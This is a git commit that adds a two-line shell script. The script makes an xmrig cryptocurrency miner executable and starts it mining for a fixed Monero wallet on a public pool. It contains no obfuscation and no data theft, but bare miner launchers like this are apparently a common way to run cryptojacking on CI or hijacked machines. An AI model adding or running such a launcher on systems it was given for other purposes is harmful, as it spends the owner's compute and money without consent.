f531cd74fcb42cb8f5d3b4a3b8187858815ca15c
Qwyuhiji <131411299+Qwyuhiji@users.noreply.github.com>
2023-04-21 05:36:00 +0700

    Create script.sh

---
+++ script.sh
@@ -0,0 +1,2 @@
+chmod 500 xmrig
+./xmrig --url pool.hashvault.pro:80 --user 85HtWS4dAQ73a5kpb9SwBmJqrAqbXmpyWjci54cpQRXfCg48D93Bmqs4U5ZnkKPHQwTNdwLViSv9eeEoPJ8itYsVNsWsv1G --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
